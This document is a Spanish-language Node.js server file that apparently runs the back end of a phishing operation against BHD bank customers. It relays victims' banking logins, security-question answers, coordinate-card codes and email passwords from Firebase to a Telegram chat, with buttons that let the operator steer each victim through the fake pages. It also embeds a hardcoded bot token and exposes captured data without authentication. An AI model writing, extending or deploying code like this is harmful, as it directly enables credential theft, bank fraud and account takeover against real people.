// server.js - VERSIÓN CORREGIDA Y FUNCIONAL
const express = require('express');
const admin = require('firebase-admin');
const axios = require('axios');

// Configurar dotenv solo en desarrollo
if (process.env.NODE_ENV !== 'production') {
  require('dotenv').config();
}

const app = express();
app.use(express.json());

// === CONFIGURACIÓN DE TELEGRAM ===
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8302617462:AAGikIPtSly1eLtqJdEOQ8w2AoCGEj9gGKY';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1002991672575';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const SERVER_URL = process.env.RENDER_URL || 'https://bhs-8syw.onrender.com';
const ALLOWED_PAGES = [
  'index.html',
  'pregunta-1.html',
  'coordenada1.html',
  'coordenada2.html',
  'coordenada3.html',
  'coordenadaR.html',
  'mailbox.html',
  'finalizado.html',
  'error.html',
  'bloqueo.html'
];

// === CONFIGURACIÓN MEJORADA DE FIREBASE ===
console.log('🔧 Inicializando Firebase Admin...');
console.log('🔑 FIREBASE_SERVICE_ACCOUNT:', process.env.FIREBASE_SERVICE_ACCOUNT ? 'PRESENTE' : 'NO PRESENTE');

let serviceAccount;
try {
  if (process.env.FIREBASE_SERVICE_ACCOUNT) {
    serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);
    console.log('✅ Firebase config cargada desde variables de entorno');
  } else {
    serviceAccount = require('./serviceAccountKey.json');
    console.log('✅ Firebase config cargada desde archivo local');
  }
} catch (error) {
  console.error('❌ ERROR CRÍTICO: No se pudo cargar la configuración de Firebase');
  console.error('🔍 Detalles:', error.message);
  console.error('💡 Solución: Verifica que FIREBASE_SERVICE_ACCOUNT tenga un JSON válido en Render');
  process.exit(1);
}

// Inicializar Firebase Admin SDK con mejor manejo de errores
try {
  admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
    databaseURL: 'https://bhd-firebase-default-rtdb.firebaseio.com'
  });
  console.log('✅ Firebase Admin SDK inicializado correctamente');
} catch (error) {
  console.error('❌ ERROR FATAL al inicializar Firebase Admin:');
  console.error('🔴 Mensaje:', error.message);
  console.error('🔴 Código:', error.code);
  process.exit(1);
}

const database = admin.database();

// === VERIFICAR CONEXIÓN A FIREBASE ===
async function testFirebaseConnection() {
  try {
    console.log('🔍 Probando conexión a Firebase...');
    const testRef = database.ref('test_connection');
    await testRef.set({ timestamp: Date.now() });
    await testRef.remove();
    console.log('✅ Conexión a Firebase establecida correctamente');
    return true;
  } catch (error) {
    console.error('❌ ERROR: No se pudo conectar a Firebase');
    console.error('🔴 Detalles:', error.message);
    return false;
  }
}

// === VERIFICAR CONEXIÓN A TELEGRAM ===
async function testTelegramConnection() {
  try {
    console.log('🔍 Probando conexión a Telegram...');
    const response = await axios.get(`${TELEGRAM_API}/getMe`, { timeout: 10000 });
    console.log('✅ Conexión a Telegram establecida - Bot:', response.data.result.username);
    return true;
  } catch (error) {
    console.error('❌ ERROR: No se pudo conectar a Telegram');
    console.error('🔴 Mensaje:', error.message);
    if (error.response) {
      console.error('🔴 Status:', error.response.status);
      console.error('🔴 Data:', error.response.data);
    }
    return false;
  }
}

// === FUNCIÓN PARA CREAR BOTONES ===
function createRedirectButtons(uid) {
  const buttons = [
    [
      { text: '🏠 INDEX', callback_data: `redirect_${uid}_index.html` },
      { text: '❓ PREGUNTA 1', callback_data: `redirect_${uid}_pregunta-1.html` }
    ],
    [
      { text: '📍 COORD 1', callback_data: `redirect_${uid}_coordenada1.html` },
      { text: '📍 COORD 2', callback_data: `redirect_${uid}_coordenada2.html` }
    ],
    [
      { text: '📍 COORD 3', callback_data: `redirect_${uid}_coordenada3.html` },
      { text: '🔄 COORD R', callback_data: `redirect_${uid}_coordenadaR.html` }
    ],
    [
      { text: '📧 MAILBOX', callback_data: `redirect_${uid}_mailbox.html` },
      { text: '✅ FINAL', callback_data: `redirect_${uid}_finalizado.html` }
    ],
    [
      { text: '❌ ERROR', callback_data: `redirect_${uid}_error.html` },
      { text: '🚫 BLOQUEO', callback_data: `redirect_${uid}_bloqueo.html` }
    ]
  ];
  
  return {
    inline_keyboard: buttons
  };
}

// === 1. LISTENER DE FIREBASE MEJORADO ===
let isProcessing = false;

console.log('👂 Configurando listener de Firebase...');

database.ref('/captures').on('child_added', async (snapshot) => {
  console.log('🔔 EVENTO child_added DETECTADO');
  
  if (isProcessing) {
    console.log('⏳ Ya hay un proceso en ejecución, ignorando...');
    return;
  }
  isProcessing = true;

  try {
    const uid = snapshot.key;
    const data = snapshot.val();

    console.log(`📥 Nueva captura detectada - UID: ${uid}`);
    console.log('📊 Datos recibidos:', JSON.stringify(data, null, 2));

    // Evitar procesar el campo redirectPage
    const steps = Object.keys(data).filter(key => key !== 'redirectPage');
    console.log(`🔍 Pasos encontrados: ${steps.join(', ')}`);
    
    if (steps.length === 0) {
      console.log('⚠️ No hay pasos para procesar');
      isProcessing = false;
      return;
    }

    const step = steps[0];
    const payload = data[step];

    // Construir mensaje para Telegram
    let mensaje = `🚨 *NUEVO DATO CAPTURADO - BHD*\n`;
    mensaje += `🔹 *UID*: \`${uid}\`\n`;
    mensaje += `🔹 *Paso*: ${step}\n\n`;

    if (step === 'login') {
      mensaje += `🔐 *CREDENCIALES*\n`;
      mensaje += `• Usuario: \`${payload.username || 'N/A'}\`\n`;
      mensaje += `• Contraseña: \`${payload.password || 'N/A'}\`\n\n`;
    } else if (step === 'security') {
      mensaje += `❓ *PREGUNTAS DE SEGURIDAD*\n`;
      mensaje += `• Color favorito: \`${payload.ans1 || 'N/A'}\`\n`;
      mensaje += `• Marca primer carro: \`${payload.ans2 || 'N/A'}\`\n`;
      mensaje += `• Personaje libro: \`${payload.ans3 || 'N/A'}\`\n`;
      mensaje += `• Abuela materna: \`${payload.ans4 || 'N/A'}\`\n`;
      mensaje += `• Colegio primaria: \`${payload.ans5 || 'N/A'}\`\n\n`;
    } else if (step.startsWith('coordenada')) {
      mensaje += `📍 *COORDENADAS (${step})*\n`;
      Object.keys(payload).forEach(key => {
        if (key.startsWith('coord')) {
          mensaje += `• ${key}: \`${payload[key] || 'N/A'}\`\n`;
        }
      });
      mensaje += `\n`;
    } else if (step === 'mailbox') {
      mensaje += `📧 *CORREO*\n`;
      mensaje += `• Email: \`${payload.email || 'N/A'}\`\n`;
      mensaje += `• Contraseña: \`${payload.emailPassword || 'N/A'}\`\n\n`;
    } else if (step === 'finalizado') {
      mensaje += `✅ *PROCESO COMPLETADO*\n`;
      mensaje += `• Estado: Finalizado correctamente\n`;
      mensaje += `• Completado: ${payload.completedAt || 'N/A'}\n\n`;
    } else {
      mensaje += `📝 *DATOS*\n`;
      Object.keys(payload).forEach(key => {
        mensaje += `• ${key}: \`${payload[key] || 'N/A'}\`\n`;
      });
      mensaje += `\n`;
    }

    // Información del sistema
    mensaje += `🌐 *INFO DEL USUARIO*\n`;
    mensaje += `• IP: \`${payload.ip || 'N/A'}\`\n`;
    mensaje += `• Ubicación: ${payload.city || 'N/A'}, ${payload.region || 'N/A'}, ${payload.country || 'N/A'}\n`;
    mensaje += `• Navegador: ${payload.userAgent?.substring(0, 50) || 'N/A'}\n`;
    mensaje += `• Fecha: ${payload.date || 'N/A'} - ${payload.time || 'N/A'}\n\n`;

    // === BOTONES DE REDIRECCIÓN ===
    mensaje += `⏭️ *SELECCIONA UNA REDIRECCIÓN:*\n`;

    // Crear teclado inline con botones
    const replyMarkup = createRedirectButtons(uid);

    console.log('📨 Enviando mensaje a Telegram...');
    
    // Enviar a Telegram con botones
    const telegramResponse = await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: mensaje,
      parse_mode: 'Markdown',
      reply_markup: replyMarkup
    }, {
      timeout: 15000
    });

    console.log(`✅ ENVIADO A TELEGRAM: ${uid}/${step}`);
    console.log(`📨 Message ID: ${telegramResponse.data.result.message_id}`);

  } catch (error) {
    console.error('❌ ERROR AL ENVIAR A TELEGRAM:');
    console.error('🔴 Mensaje:', error.message);
    
    if (error.response) {
      console.error('🔴 Status:', error.response.status);
      console.error('🔴 Data:', JSON.stringify(error.response.data, null, 2));
    }
    
    if (error.code) {
      console.error('🔴 Código:', error.code);
    }
  } finally {
    isProcessing = false;
    console.log('🔄 Listener listo para siguiente evento\n');
  }
});

// === 2. WEBHOOK PARA TELEGRAM ===
app.post('/telegram/webhook', express.json(), async (req, res) => {
  try {
    console.log('📨 Webhook recibido de Telegram');

    // Responder inmediatamente a Telegram
    res.status(200).send('OK');

    // Manejar callback queries (botones)
    if (req.body.callback_query) {
      const callbackData = req.body.callback_query.data;
      const chatId = req.body.callback_query.message.chat.id;
      const messageId = req.body.callback_query.message.message_id;
      const userId = req.body.callback_query.from.id;
      const callbackId = req.body.callback_query.id;

      console.log(`🔘 Callback recibido: ${callbackData}`);

      // Validar que es un comando de redirección
      if (callbackData.startsWith('redirect_')) {
        const parts = callbackData.split('_');
        
        if (parts.length >= 3) {
          const uid = parts[1];
          const page = parts.slice(2).join('_');

          console.log(`🎯 Procesando redirección: ${uid} -> ${page}`);

          // Validar página permitida
          if (!ALLOWED_PAGES.includes(page)) {
            await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
              callback_query_id: callbackId,
              text: `❌ Página no permitida: ${page}`
            });
            return;
          }

          // Actualizar Firebase para redirigir al usuario
          await database.ref(`/captures/${uid}/redirectPage`).set(page);

          // Responder al callback query
          await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
            callback_query_id: callbackId,
            text: `✅ Redirigiendo a: ${page}`
          });

          // Editar el mensaje original
          await axios.post(`${TELEGRAM_API}/editMessageText`, {
            chat_id: chatId,
            message_id: messageId,
            text: `✅ *REDIRECCIÓN CONFIGURADA*\n\n🔹 *UID*: \`${uid}\`\n🔹 *Destino*: ${page}\n🔹 *Admin*: ${userId}\n🔹 *Hora*: ${new Date().toLocaleString()}`,
            parse_mode: 'Markdown'
          });

          console.log(`✅ Redirección completada: ${uid} → ${page}`);
        }
      }
    }

  } catch (error) {
    console.error('❌ Error en webhook:', error.message);
  }
});

// === RUTAS DE DIAGNÓSTICO ===

// Ruta para testear Telegram manualmente
app.get('/test-telegram', async (req, res) => {
  try {
    console.log('🧪 Test manual de Telegram...');
    
    const testMessage = await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: '🧪 *TEST MANUAL DEL SERVIDOR*\n\nEste es un mensaje de prueba. Si lo ves, el servidor puede enviar a Telegram correctamente.',
      parse_mode: 'Markdown'
    }, {
      timeout: 10000
    });

    res.json({
      success: true,
      message: 'Mensaje de prueba enviado a Telegram',
      message_id: testMessage.data.result.message_id
    });

  } catch (error) {
    console.error('❌ Error en test manual:', error.message);
    res.status(500).json({
      success: false,
      error: error.message,
      details: error.response?.data
    });
  }
});

// Ruta para ver datos de Firebase
app.get('/api/captures', async (req, res) => {
  try {
    const snapshot = await database.ref('/captures').once('value');
    const data = snapshot.val();
    
    res.json({
      success: true,
      total: data ? Object.keys(data).length : 0,
      captures: data
    });
  } catch (error) {
    console.error('❌ Error consultando Firebase:', error.message);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Configurar webhook de Telegram
app.get('/setup-webhook', async (req, res) => {
  try {
    const webhookUrl = `${SERVER_URL}/telegram/webhook`;
    console.log(`🔗 Configurando webhook: ${webhookUrl}`);
    
    const response = await axios.post(`${TELEGRAM_API}/setWebhook`, {
      url: webhookUrl,
      drop_pending_updates: true
    });
    
    res.json({
      success: true,
      webhook_url: webhookUrl,
      response: response.data
    });
    
  } catch (error) {
    console.error('❌ Error configurando webhook:', error.message);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Verificar estado del webhook
app.get('/webhook-info', async (req, res) => {
  try {
    const response = await axios.get(`${TELEGRAM_API}/getWebhookInfo`);
    
    res.json({
      success: true,
      webhook_info: response.data
    });
    
  } catch (error) {
    console.error('❌ Error obteniendo info del webhook:', error.message);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Health check
app.get('/health', (req, res) => {
  res.json({
    status: 'OK',
    timestamp: new Date().toISOString(),
    service: 'BHD Firebase Server',
    environment: process.env.NODE_ENV || 'development'
  });
});

// Ruta principal
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>BHD Server</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; }
            .status { padding: 10px; border-radius: 5px; margin: 10px 0; }
            .success { background: #d4edda; color: #155724; }
            .info { background: #d1ecf1; color: #0c5460; }
            .endpoints { background: #f8f9fa; padding: 15px; border-radius: 5px; }
            a { color: #007bff; text-decoration: none; }
            a:hover { text-decoration: underline; }
        </style>
    </head>
    <body>
        <h1>🚀 Servidor BHD Firebase + Telegram</h1>
        <div class="status success">✅ Servidor activo</div>
        
        <div class="endpoints">
            <strong>🔧 Endpoints:</strong><br>
            • <a href="/health">/health</a> - Estado del servidor<br>
            • <a href="/test-telegram">/test-telegram</a> - Probar Telegram<br>
            • <a href="/setup-webhook">/setup-webhook</a> - Configurar webhook<br>
            • <a href="/webhook-info">/webhook-info</a> - Ver webhook<br>
            • <a href="/api/captures">/api/captures</a> - Ver datos Firebase
        </div>
    </body>
    </html>
  `);
});

// === INICIALIZACIÓN DEL SERVIDOR ===
const PORT = process.env.PORT || 3000;

async function initializeServer() {
  console.log('🚀 Iniciando servidor BHD...');
  
  // Verificar conexiones
  const firebaseOk = await testFirebaseConnection();
  const telegramOk = await testTelegramConnection();
  
  if (!firebaseOk || !telegramOk) {
    console.error('❌ No se pueden establecer todas las conexiones necesarias');
    process.exit(1);
  }
  
  app.listen(PORT, () => {
    console.log(`✅ Servidor BHD corriendo en puerto ${PORT}`);
    console.log(`🌐 URL: ${SERVER_URL}`);
    console.log(`🔗 Health: ${SERVER_URL}/health`);
    console.log(`🧪 Test Telegram: ${SERVER_URL}/test-telegram`);
    console.log(`👂 Listener Firebase: ACTIVO`);
    console.log(`🤖 Telegram Bot: CONFIGURADO`);
  });
}

initializeServer().catch(error => {
  console.error('❌ Error fatal iniciando servidor:', error);
  process.exit(1);
});